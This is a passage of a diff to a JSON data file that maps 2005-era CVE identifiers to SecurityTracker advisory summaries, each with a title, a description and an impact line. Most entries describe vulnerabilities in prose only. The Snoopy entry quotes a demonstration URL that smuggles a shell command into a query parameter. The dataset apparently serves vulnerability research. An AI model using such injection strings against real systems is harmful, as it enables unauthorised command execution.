+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2930": [
+      {
+        "url": "http://securitytracker.com/id?1015120",
+        "title": "chmlib Buffer Overflow in *_chm_find_in_PMGL() Lets Remote Users Execute Arbitrary Code",
+        "body": "iDEFENSE reported a vulnerability in chmlib. A remote user can cause arbitrary code to be executed on the target user's system.The chmlib library contains a buffer overflow in the *_chm_find_in_PMGL() function. A remote user can create a specially crafted CHM file that, when processed by the target user, will execute arbitrary code with the privileges of the target user.The flaw resides in 'chm_lib.c'.The vendor was notified on September 8, 2005.The original advisory is available at:http://www.idefense.com/application/poi/display?id=332&type=vulnerabilities",
+        "extra": "A remote user can create a file that, when processed by the target user, will cause arbitrary code to be executed with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2932": [
+      {
+        "url": "http://securitytracker.com/id?1018588",
+        "title": "ZoneAlarm Default File Permissions Let Local Users Gain Elevated Privileges",
+        "body": "A vulnerability was reported in ZoneAlarm. A local user can obtain elevated privileges on the target system.The default file Access Control List settings used during product installation allow a local user to make arbitrary modifications to the installed files. Some of the modified files will run with system privileges.A local user can also delete the files to disable the provided protection upon reboot.Several ZoneAlarm products are affected.The vendor was notified on September 29, 2005.iDefense reported this vulnerability.",
+        "extra": "A local user can obtain system privileges on the target system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2936": [
+      {
+        "url": "http://securitytracker.com/id?1015223",
+        "title": "RealPlayer Improper CreateProcess() Call Lets Local Users Execute Arbitrary Code",
+        "body": "iDEFENSE reported a vulnerability in RealPlayer. A local user may be able to cause arbitrary code to be executed by another user.The software makes an incorrect CreateProcess() function call when launching a component application. As a result, the software may search multiple system paths to find the (ostensibly) proper component. A local user can create arbitrary code with the same name as the intended application. If the code is placed in the appropriate directory and the target application is executed by the target user, the arbitrary code will be executed with the privileges of the target user.The vendor was notified on September 19, 2005.The original advisory is available at:http://www.idefense.com/application/poi/display?id=340&type=vulnerabilities",
+        "extra": "A local user can cause arbitrary code to be executed with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2938": [
+      {
+        "url": "http://securitytracker.com/id?1015222",
+        "title": "Apple iTunes for Windows Improper CreateProcess() Call Lets Local Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in iTunes for Windows. A local user may be able to cause arbitrary code to be executed by another user.The software makes an incorrect CreateProcess() function call when launching its helper application. As a result, the software may search multiple system paths to find the (ostensibly) proper application.A local user can create arbitrary code with the same name as the intended application.If the code is placed in the appropriate directory and the iTunes helper application is executed by the target user, the arbitrary code will be executed with the privileges of the target user.The vendor credits iDEFENSE with reporting this vulnerability.",
+        "extra": "A local user can cause arbitrary code to be executed with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2975": [
+      {
+        "url": "http://securitytracker.com/id?1015216",
+        "title": "gdk-pixbuf Bugs in Processing XPM Images Let Remote Users Deny Service or Execute Arbitrary Code",
+        "body": "Several vulnerabilities were reported in gdk-pixbuf. A remote user can cause arbitrary code to be executed on the target user's system. A remote user can also cause denial of service conditions.A remote user can create a specially crafted XPM image file that, when processed using gdk-pixbuf, may cause arbitrary code to be executed on the target system [CVE-2005-3186].An integer overflow also exists, allowing a remote user to cause arbitrary code to be executed or to cause the target application to crash [CVE-2005-2976]. Ludwig Nussel discovered this vulnerability.A remote user can cause the target application to enter an infinite loop and stop responding [CVE-2005-2975]. Ludwig Nussel discovered this vulnerability.gtk2 is also affected by these vulnerabilities.",
+        "extra": "A remote user can cause arbitrary code to be executed on the target user's system.A remote user can cause denial of service conditions.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-2976": [
+      {
+        "url": "http://securitytracker.com/id?1015216",
+        "title": "gdk-pixbuf Bugs in Processing XPM Images Let Remote Users Deny Service or Execute Arbitrary Code",
+        "body": "Several vulnerabilities were reported in gdk-pixbuf. A remote user can cause arbitrary code to be executed on the target user's system. A remote user can also cause denial of service conditions.A remote user can create a specially crafted XPM image file that, when processed using gdk-pixbuf, may cause arbitrary code to be executed on the target system [CVE-2005-3186].An integer overflow also exists, allowing a remote user to cause arbitrary code to be executed or to cause the target application to crash [CVE-2005-2976]. Ludwig Nussel discovered this vulnerability.A remote user can cause the target application to enter an infinite loop and stop responding [CVE-2005-2975]. Ludwig Nussel discovered this vulnerability.gtk2 is also affected by these vulnerabilities.",
+        "extra": "A remote user can cause arbitrary code to be executed on the target user's system.A remote user can cause denial of service conditions.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3051": [
+      {
+        "url": "http://securitytracker.com/id?1017261",
+        "title": "Turbo Searcher Buffer Overflow in 'arj.dll' Component Lets Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in Turbo Searcher. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create a specially crafted ARJ archive. If the \"Quick Search\" option is disabled and the \"Search in compressed file\" option is enabled when the target user searches in a directory that contains the archive, a buffer overflow will occur and arbitrary code will be executed. The code will run with the privileges of the target user.The buffer overflow resides in the 'arj.dll' plugin component, from 7-Zip. The underlying vulnerability was previously reported in CVE-2005-3051.The vendor was notified on July 24, 2006.Tan Chew Keong discovered this vulnerability.The original advisory is available at:http://www.vuln.sg/turbosearcher330-en.html",
+        "extra": "A remote user can create an archive that, when processed in a specific manner by the target user, will execute arbitrary code on the target user's system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3088": [
+      {
+        "url": "http://securitytracker.com/id?1015114",
+        "title": "Fetchmail 'fetchmailconf' May Disclose Passwords to Local Users",
+        "body": "A vulnerability was reported in Fetchmail in the fetchmailconf utility. A local user may be able to view passwords.The fetchmailconf program opens the run control file, writes the fetchmail configuration to the file, and then changes the security permissions to mode 0600 (owner read and write). A local user may be able to access the file before the restrictive security permissions are applied to view the file contents.The file contents may include passwords.",
+        "extra": "A local user may be able to view passwords.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3185": [
+      {
+        "url": "http://securitytracker.com/id?1015056",
+        "title": "wget Buffer Overflow in Processing NTLM Authentication Values May Let Remote Users Execute Arbitrary Code",
+        "body": "iDEFENSE reported a vulnerability in wget. A remote user can cause arbitrary code to be executed on the target user's system.The software does not properly validate server-supplied NTLM user name data. When the target user connects to a remote server, the remote server can issue an HTTP 30x redirect command that redirects the target user to a URL that includes a specially crafted NTLM user name value to trigger a stack overflow and execute arbitrary code on the target user's system. The code will run with the privileges of the target user.A user name and domain name that, combined, are longer than 192 bytes will trigger the overflow.NTLM authentication must be enabled on the client for the exploit to work.The vendor was notified on October 12, 2005.The original advisory is available at:http://www.idefense.com/application/poi/display?id=322&type=vulnerabilities",
+        "extra": "A remote user can cause arbitrary code to be executed on the target user's system when the target user connects to a malicious site.",
+        "meta": {
+          "extraType": "impact"
+        }
+      },
+      {
+        "url": "http://securitytracker.com/id?1015057",
+        "title": "cURL/libcurl Buffer Overflow in Processing NTLM Authentication Values May Let Remote Users Execute Arbitrary Code",
+        "body": "iDEFENSE reported a vulnerability in cURL and libcurl. A remote user can cause arbitrary code to be executed on the target user's system.The software does not properly validate server-supplied NTLM user name data. When the target user connects to a remote server, the remote server can issue an HTTP 30x redirect command that redirects the target user to a URL that includes a specially crafted NTLM user name value to trigger a stack overflow and execute arbitrary code on the target user's system. The code will run with the privileges of the target user.A user name and domain name that, combined, are longer than 192 bytes will trigger the overflow.NTLM authentication must be enabled on the client for the exploit to work.The vendor was notified on October 12, 2005.The original advisory is available at:http://www.idefense.com/application/poi/display?id=322&type=vulnerabilities",
+        "extra": "A remote user can cause arbitrary code to be executed on the target user's system when the target user connects to a malicious site.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3191": [
+      {
+        "url": "http://securitytracker.com/id?1015309",
+        "title": "Xpdf Buffer Overflows in Processing DCT and JPX Streams May Let Remote Users Execute Arbitrary Code",
+        "body": "Several vulnerabilities were reported in Xpdf. A remote user may be able to cause arbitrary code to be executed on the target system.The DCT stream parsing code does not properly validate user-supplied input. The DCTStream::readBaselineSOF() function in 'xpdf/Stream.cc' does not properly validate the 'numComps' parameter. A remote user can create a specially crafted PDF file that, when processed by the target user, will trigger an overflow at potentially execute arbitrary code.The DCTStream::readProgressiveSOF() and StreamPredictor::StreamPredictor() functions are also affected.A similar overflow exists in the JPX Stream parsing code used in decoding embedded JPEG 2000 images. The JPXStream::readCodestream() function in 'xpdf/JPXStream.cc' does not properly validate the 'nXTiles' and 'nYTiles' parameters.The vendor was notified on October 13, 2005.iDEFENSE reported these vulnerabilities.The original advisories are available at:http://www.idefense.com/application/poi/display?id=342&type=vulnerabilitieshttp://www.idefense.com/application/poi/display?id=343&type=vulnerabilitieshttp://www.idefense.com/application/poi/display?id=344&type=vulnerabilitieshttp://www.idefense.com/application/poi/display?id=345&type=vulnerabilities",
+        "extra": "A remote user can create a specially crafted PDF file that, when processed by the target user, may be able to cause arbitrary code to be executed on the target system with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      },
+      {
+        "url": "http://securitytracker.com/id?1015324",
+        "title": "KDE KOffice kpdf Buffer Overflows in Processing DCT and JPX Streams May Let Remote Users Execute Arbitrary Code",
+        "body": "Several vulnerabilities were reported in KDE KOffice in the kpdf component. A remote user can cause arbitrary code to be executed on the target user's system.The DCT stream parsing code does not properly validate user-supplied input. The DCTStream::readBaselineSOF() function in 'Stream.cc' does not properly validate the 'numComps' parameter. A remote user can create a specially crafted PDF file that, when processed by the target user, will trigger an overflow at potentially execute arbitrary code.The DCTStream::readProgressiveSOF() and StreamPredictor::StreamPredictor() functions are also affected.A similar overflow exists in the JPX Stream parsing code used in decoding embedded JPEG 2000 images. The JPXStream::readCodestream() function in 'JPXStream.cc' does not properly validate the 'nXTiles' and 'nYTiles' parameters.The vulnerability resides in xpdf code that is shared with kpdf. The vulnerabilities in xpdf were originally reported by iDEFENSE.In January 2006, the vendor issued an update to the advisory indicating that the original patches were incomplete and have been retracted.In March 2006, it was reported that the fix for CVE-2005-3627 was not complete. The resulting vulnerability was assigned CVE-2006-0746. Marcelo Ricardo Leitner discovered this vulnerability.",
+        "extra": "A remote user can create a PDF file that, when processed by the target user, will execute arbitrary code on the target user's system with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3192": [
+      {
+        "url": "http://securitytracker.com/id?1015309",
+        "title": "Xpdf Buffer Overflows in Processing DCT and JPX Streams May Let Remote Users Execute Arbitrary Code",
+        "body": "Several vulnerabilities were reported in Xpdf. A remote user may be able to cause arbitrary code to be executed on the target system.The DCT stream parsing code does not properly validate user-supplied input. The DCTStream::readBaselineSOF() function in 'xpdf/Stream.cc' does not properly validate the 'numComps' parameter. A remote user can create a specially crafted PDF file that, when processed by the target user, will trigger an overflow at potentially execute arbitrary code.The DCTStream::readProgressiveSOF() and StreamPredictor::StreamPredictor() functions are also affected.A similar overflow exists in the JPX Stream parsing code used in decoding embedded JPEG 2000 images. The JPXStream::readCodestream() function in 'xpdf/JPXStream.cc' does not properly validate the 'nXTiles' and 'nYTiles' parameters.The vendor was notified on October 13, 2005.iDEFENSE reported these vulnerabilities.The original advisories are available at:http://www.idefense.com/application/poi/display?id=342&type=vulnerabilitieshttp://www.idefense.com/application/poi/display?id=343&type=vulnerabilitieshttp://www.idefense.com/application/poi/display?id=344&type=vulnerabilitieshttp://www.idefense.com/application/poi/display?id=345&type=vulnerabilities",
+        "extra": "A remote user can create a specially crafted PDF file that, when processed by the target user, may be able to cause arbitrary code to be executed on the target system with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      },
+      {
+        "url": "http://securitytracker.com/id?1015324",
+        "title": "KDE KOffice kpdf Buffer Overflows in Processing DCT and JPX Streams May Let Remote Users Execute Arbitrary Code",
+        "body": "Several vulnerabilities were reported in KDE KOffice in the kpdf component. A remote user can cause arbitrary code to be executed on the target user's system.The DCT stream parsing code does not properly validate user-supplied input. The DCTStream::readBaselineSOF() function in 'Stream.cc' does not properly validate the 'numComps' parameter. A remote user can create a specially crafted PDF file that, when processed by the target user, will trigger an overflow at potentially execute arbitrary code.The DCTStream::readProgressiveSOF() and StreamPredictor::StreamPredictor() functions are also affected.A similar overflow exists in the JPX Stream parsing code used in decoding embedded JPEG 2000 images. The JPXStream::readCodestream() function in 'JPXStream.cc' does not properly validate the 'nXTiles' and 'nYTiles' parameters.The vulnerability resides in xpdf code that is shared with kpdf. The vulnerabilities in xpdf were originally reported by iDEFENSE.In January 2006, the vendor issued an update to the advisory indicating that the original patches were incomplete and have been retracted.In March 2006, it was reported that the fix for CVE-2005-3627 was not complete. The resulting vulnerability was assigned CVE-2006-0746. Marcelo Ricardo Leitner discovered this vulnerability.",
+        "extra": "A remote user can create a PDF file that, when processed by the target user, will execute arbitrary code on the target user's system with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3193": [
+      {
+        "url": "http://securitytracker.com/id?1015309",
+        "title": "Xpdf Buffer Overflows in Processing DCT and JPX Streams May Let Remote Users Execute Arbitrary Code",
+        "body": "Several vulnerabilities were reported in Xpdf. A remote user may be able to cause arbitrary code to be executed on the target system.The DCT stream parsing code does not properly validate user-supplied input. The DCTStream::readBaselineSOF() function in 'xpdf/Stream.cc' does not properly validate the 'numComps' parameter. A remote user can create a specially crafted PDF file that, when processed by the target user, will trigger an overflow at potentially execute arbitrary code.The DCTStream::readProgressiveSOF() and StreamPredictor::StreamPredictor() functions are also affected.A similar overflow exists in the JPX Stream parsing code used in decoding embedded JPEG 2000 images. The JPXStream::readCodestream() function in 'xpdf/JPXStream.cc' does not properly validate the 'nXTiles' and 'nYTiles' parameters.The vendor was notified on October 13, 2005.iDEFENSE reported these vulnerabilities.The original advisories are available at:http://www.idefense.com/application/poi/display?id=342&type=vulnerabilitieshttp://www.idefense.com/application/poi/display?id=343&type=vulnerabilitieshttp://www.idefense.com/application/poi/display?id=344&type=vulnerabilitieshttp://www.idefense.com/application/poi/display?id=345&type=vulnerabilities",
+        "extra": "A remote user can create a specially crafted PDF file that, when processed by the target user, may be able to cause arbitrary code to be executed on the target system with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      },
+      {
+        "url": "http://securitytracker.com/id?1015324",
+        "title": "KDE KOffice kpdf Buffer Overflows in Processing DCT and JPX Streams May Let Remote Users Execute Arbitrary Code",
+        "body": "Several vulnerabilities were reported in KDE KOffice in the kpdf component. A remote user can cause arbitrary code to be executed on the target user's system.The DCT stream parsing code does not properly validate user-supplied input. The DCTStream::readBaselineSOF() function in 'Stream.cc' does not properly validate the 'numComps' parameter. A remote user can create a specially crafted PDF file that, when processed by the target user, will trigger an overflow at potentially execute arbitrary code.The DCTStream::readProgressiveSOF() and StreamPredictor::StreamPredictor() functions are also affected.A similar overflow exists in the JPX Stream parsing code used in decoding embedded JPEG 2000 images. The JPXStream::readCodestream() function in 'JPXStream.cc' does not properly validate the 'nXTiles' and 'nYTiles' parameters.The vulnerability resides in xpdf code that is shared with kpdf. The vulnerabilities in xpdf were originally reported by iDEFENSE.In January 2006, the vendor issued an update to the advisory indicating that the original patches were incomplete and have been retracted.In March 2006, it was reported that the fix for CVE-2005-3627 was not complete. The resulting vulnerability was assigned CVE-2006-0746. Marcelo Ricardo Leitner discovered this vulnerability.",
+        "extra": "A remote user can create a PDF file that, when processed by the target user, will execute arbitrary code on the target user's system with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3269": [
+      {
+        "url": "http://securitytracker.com/id?1015014",
+        "title": "Sun Directory Server Unspecified Bug Lets Remote Users Compromise the System",
+        "body": "A vulnerability was reported in Sun Directory Server. A remote user can compromise the target system.A remote user can exploit the HTTP administrative interface to execute arbitrary commands with the privileges of the admin server process (which are typically root user privileges).Peter Winter-Smith of NGSSoftware discovered this vulnerability.",
+        "extra": "A remote user can compromise the target system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      },
+      {
+        "url": "http://securitytracker.com/id?1015537",
+        "title": "Sun Directory Server Buffer Overflow in Help System May Let Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in Sun Directory Server (Netscape Directory Server). A remote user may be able to execute arbitrary code. A local user may be able to obtain elevated privileges.A remote user can send a specially crafted request to the Management Console to trigger a stack overflow in the Help buttons on the Admin pages.On UNIX-based systems, remote code execution is not possible.In some situations, a local user can execute arbitrary code with root level privileges.Fedora Directory Server is not affected.Peter Winter-Smith of NGSSoftware discovered this vulnerability.",
+        "extra": "A remote user may be able to execute arbitrary code on the target system.A local user can execute arbitrary code with root level privileges.",
+        "meta": {
+          "extraType": "impact"
+        }
+      },
+      {
+        "url": "http://securitytracker.com/id?1015536",
+        "title": "Red Hat Directory Server Buffer Overflow in Help System May Let Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in Red Hat Directory Server. A remote user may be able to execute arbitrary code. A local user may be able to obtain elevated privileges.A remote user can send a specially crafted request to the Management Console to trigger a stack overflow in the Help buttons on the Admin pages.On UNIX-based systems, remote code execution is not possible.In some situations, a local user can execute arbitrary code with root level privileges.Fedora Directory Server is not affected.Peter Winter-Smith of NGSSoftware discovered this vulnerability.",
+        "extra": "A remote user may be able to execute arbitrary code on the target system.A local user can execute arbitrary code with root level privileges.",
+        "meta": {
+          "extraType": "impact"
+        }
+      },
+      {
+        "url": "http://securitytracker.com/id?1015538",
+        "title": "Red Hat Certificate Server Buffer Overflow in Help System May Let Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in Red Hat Certificate Server. A remote user may be able to execute arbitrary code. A local user may be able to obtain elevated privileges.A remote user can send a specially crafted request to the Management Console to trigger a stack overflow in the Help buttons on the Admin pages.On UNIX-based systems, remote code execution is not possible.In some situations, a local user can execute arbitrary code with root level privileges.Peter Winter-Smith of NGSSoftware discovered this vulnerability.",
+        "extra": "A remote user may be able to execute arbitrary code on the target system.A local user can execute arbitrary code with root level privileges.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3273": [
+      {
+        "url": "http://securitytracker.com/id?1014115",
+        "title": "Linux Kernel Radionet Open Source Environment (ROSE) ndigis Input Validation Flaw Has Unspecified Impact",
+        "body": "A vulnerability was reported in the Linux kernel in the Radionet Open Source Environment (ROSE) implementation. The impact was not specified.The rose_rt_ioctl() function does not properly validate a new route's ndigis argument.The vendor described the impact as \"minor\".The flaw resides in 'net/rose/rose_route.c'.[Editor's note: This vulnerability was reported by Bryan Fulton of Coverity on December 16, 2004, in a message to the Linux-Kernel mailing list. The message covered several other related flaws in the kernel that are reported in separate alerts.]",
+        "extra": "The impact was not specified.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3283": [
+      {
+        "url": "http://securitytracker.com/id?1015087",
+        "title": "TikiWiki Unspecified Bug Lets Remote Users Conduct Cross-Site Scripting Attacks",
+        "body": "A vulnerability was reported in TikiWiki. A remote user can conduct cross-site scripting attacks.A remote user can cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the TikiWiki software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.No details were provided.",
+        "extra": "A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the TikiWiki software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3314": [
+      {
+        "url": "http://securitytracker.com/id?1015240",
+        "title": "Novell NetMail Buffer Overflows in IMAP Service May Let Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in Novell NetMail. A remote user may be able to execute arbitrary code on the target system.A remote user can connect to the target IMAP service to trigger a buffer overflow and potentially execute arbitrary code on the target system.The vendor credits Sebastian Apelt with discovering this vulnerability.[Editor's note: It is not clear whether authentication is required or not required to exploit this flaw.]",
+        "extra": "A remote user may be able to execute arbitrary code on the target system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3317": [
+      {
+        "url": "http://securitytracker.com/id?1015090",
+        "title": "ZipGenius Buffer Overflows in Processing ACE and ZIP Archives and UUE Encoded Files Let Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in ZipGenius. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create a specially crafted archive that, when processed by the target user with ZipGenius, will trigger an overflow and execute arbitrary code on the target user's system. The code will run with the privileges of the target user.The processing of ACE archives, ZIP archives, and UUE/XXE/MIM encoded files contains buffer overflow vulnerabilities.A specially crafted filename of a compressed file in a ZIP archive can trigger an overflow in \"zipgenius.exe\", \"zg.exe\", \"zgtips.dll\", and \"contmenu.dll\".A specially crafted original filename of a UUE/XXE/MIM encoded file can trigger an overflow in \"zipgenius.exe\".A specially crafted filename in an ACE archive can trigger an overflow in \"unacev2.dll\".The vendor was notified on October 4, 2005.Tan Chew Keong of Secunia Research discovered this vulnerability.",
+        "extra": "A remote user can create an archive that, when processed by the target user, will execute arbitrary code on the target user's system with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3330": [
+      {
+        "url": "http://securitytracker.com/id?1015104",
+        "title": "Snoopy Input Validation Hole in _httpsrequest() Lets Remote Execute Arbitrary Commands",
+        "body": "A vulnerability was reported in Snoopy. A remote user may be able to execute arbitrary code on the target system.The _httpsrequest() function does not properly validate user-supplied input before making a PHP exec() call. A remote user can supply a specially crafted URL to executed arbitrary commands on the target system with the privileges of the target web service.The specific impact depends on the application that uses the affected Snoop library function.A demonstration exploit URL [for a hypothetical 'fetch.php' script] is provided:http://[target]/fetch.php?url=https://www.%22;+echo+'hello'+%3E+test.txtThe vendor was notified on October 24, 2005.Daniel Fabian of SEC Consult reported this vulnerability.",
+        "extra": "A remote user can execute arbitrary commands on the target system with the privileges of the target web service. The specific impact depends on how an application uses the affected library function.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3357": [
+      {
+        "url": "http://securitytracker.com/id?1015447",
+        "title": "Apache mod_ssl Null Pointer Dereference May Let Remote Users Deny Service",
+        "body": "A vulnerability was reported in Apache mod_ssl. A remote user can cause the server to crash in certain cases.When an SSL virtual host is configured with access control and a custom 400 error document, a remote user can send a specially crafted request to trigger a null pointer dereference. This may cause the server to crash when using the non-default workerMulti-Processing Module.The original bug report is available at:http://issues.apache.org/bugzilla/show_bug.cgi?id=37791Hartmut Keil reported this vulnerability.",
+        "extra": "A remote user can cause denial of service conditions on the target system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3398": [
+      {
+        "url": "http://securitytracker.com/id?1015112",
+        "title": "Solaris Management Console Enables HTTP TRACE Support By Default",
+        "body": "A vulnerability was reported in the Solaris Management Console. A remote user can conduct HTTP TRACE attacks.The Solaris Management Console (smc(1M)) includes a web server that has the HTTP TRACE method enabled by default. A remote user may be able to exploit this, in combination with separate, cross-domain browser vulnerabilities, to access sensitive information from the HTTP headers of an HTTP TRACE request, such as cookies or authentication data.",
+        "extra": "A remote user can conduct HTTP TRACE attacks to obtain potentially sensitive information.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3467": [
+      {
+        "url": "http://securitytracker.com/id?1015151",
+        "title": "Serv-U FTP Server Can Be Crashed By Remote Users",
+        "body": "A vulnerability was reported in Serv-U FTP Server. A remote user can cause the service to crash.A remote user can send specially crafted packets to cause the FTP service to crash.",
+        "extra": "A remote user can cause the target service to crash.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3498": [
+      {
+        "url": "http://securitytracker.com/id?1015134",
+        "title": "IBM WebSphere Session Manager Tracing May Disclose Potentially Sensitive Information",
+        "body": "A vulnerability was reported in IBM WebSphere. The log file may record potentially sensitive information in certain cases.When tracing for the session manager is enabled, the queryString is logged when a URL is encoded. As a result, potentially sensitive information contained in URLs may be written to the log.",
+        "extra": "The log file may record potentially sensitive information in certain cases.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3501": [
+      {
+        "url": "http://securitytracker.com/id?1015154",
+        "title": "Clam AntiVirus CAB, FSG, and OLE Bugs Let Remote Users Deny Service or Execute Arbitrary Code",
+        "body": "Several vulnerabilities were reported in Clam AntiVirus. A remote user can cause arbitrary code to be executed on the target system. A remote user can also cause denial of service conditions.The tnef_attachment() function in 'tnef.c' does not properly validate user-supplied input. A remote user can create a specially crafted CAB file that, when processed, will cause the system to enter an infinite loop.The cabd_find() function in 'mspack/cabd.c' in the libmspack library also lets a remote user cause the system to enter an infinite loop.The vendor was notified of these vulnerabilities on October 7, 2005.The software ('libclamav/fsg.c') does not properly unpack executable files compressed with FSG v1.33 [CVE-2005-3303]. A remote user can create a compressed file that, when processed by the target user, will trigger a heap overflow and execute arbitrary code.The vendor was notified on October 24, 2005.The OLE2 unpacker in clamd does not properly process DOC files with an invalid property tree [CVE-2005-3239]. A specially crafted file can triger an infinite recursion in the ole2_walk_property_tree function, causing denial of service conditions. The flaw resides in 'libclamav/ole2_extract.c'. Systems with default settings are not affected.The vendor credits iDEFENSE and Zero Day Initiative with reporting some of these vulnerabilities.",
+        "extra": "A remote user can cause the system to execute arbitrary code.A remote user can cause the system to enter an infinite loop.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3552": [
+      {
+        "url": "http://securitytracker.com/id?1015167",
+        "title": "PHPKIT Has Multiple Bugs That Permit Remote Code Execution, SQL Injection, and Cross-Site Scripting Attacks",
+        "body": "Several vulnerabilities were reported in PHPKIT. A remote user can inject SQL commands, conduct cross-site scripting attacks, and execute arbitrary code on the target system.Several scripts do not properly filter HTML code from user-supplied input before displaying the input. A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the PHPKIT software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.The screen name fields in the 'login/profile.php' and 'login/userinfo.php' scripts are affected.The 'site_body' field in 'admin/admin.php' is affected if register_globals is enabled.The HTTP Referer value is affected when the administrator views browser 'referer' statistics.The title tag and the alt image attribute are not filtered within a forum posting.The subject line of 'imcenter.php' is affected.The 'Homepage' field in the guestbook is affected.A remote user can also supply a specially crafted parameter value to execute SQL commands on the underlying database. Several scripts are affected, including some of those mentioned above.A remote user can supply a specially crafted path parameter to include files on the target system. Files that are ostensibly PNG image files (but are actually PHP files) are affected.If register_globals is enabled, a remoter user can supply a specially crafted parameter value containing eval() syntax characters (i.e., curly braces) to execute arbitrary PHP code on the target system.The vendor was notified on September 30, 2005.Christopher Kunz, Stefan Esser, Stefan Walk, and Johann-Peter Hartmann discovered these vulnerabilities.The original advisory is available at:http://www.hardened-php.net/advisory_212005.80.html",
+        "extra": "A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the PHPKIT software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.A remote user can execute SQL commands on the underlying database.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3553": [
+      {
+        "url": "http://securitytracker.com/id?1015167",
+        "title": "PHPKIT Has Multiple Bugs That Permit Remote Code Execution, SQL Injection, and Cross-Site Scripting Attacks",
+        "body": "Several vulnerabilities were reported in PHPKIT. A remote user can inject SQL commands, conduct cross-site scripting attacks, and execute arbitrary code on the target system.Several scripts do not properly filter HTML code from user-supplied input before displaying the input. A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the PHPKIT software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.The screen name fields in the 'login/profile.php' and 'login/userinfo.php' scripts are affected.The 'site_body' field in 'admin/admin.php' is affected if register_globals is enabled.The HTTP Referer value is affected when the administrator views browser 'referer' statistics.The title tag and the alt image attribute are not filtered within a forum posting.The subject line of 'imcenter.php' is affected.The 'Homepage' field in the guestbook is affected.A remote user can also supply a specially crafted parameter value to execute SQL commands on the underlying database. Several scripts are affected, including some of those mentioned above.A remote user can supply a specially crafted path parameter to include files on the target system. Files that are ostensibly PNG image files (but are actually PHP files) are affected.If register_globals is enabled, a remoter user can supply a specially crafted parameter value containing eval() syntax characters (i.e., curly braces) to execute arbitrary PHP code on the target system.The vendor was notified on September 30, 2005.Christopher Kunz, Stefan Esser, Stefan Walk, and Johann-Peter Hartmann discovered these vulnerabilities.The original advisory is available at:http://www.hardened-php.net/advisory_212005.80.html",
+        "extra": "A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the PHPKIT software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.A remote user can execute SQL commands on the underlying database.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3554": [
+      {
+        "url": "http://securitytracker.com/id?1015167",
+        "title": "PHPKIT Has Multiple Bugs That Permit Remote Code Execution, SQL Injection, and Cross-Site Scripting Attacks",
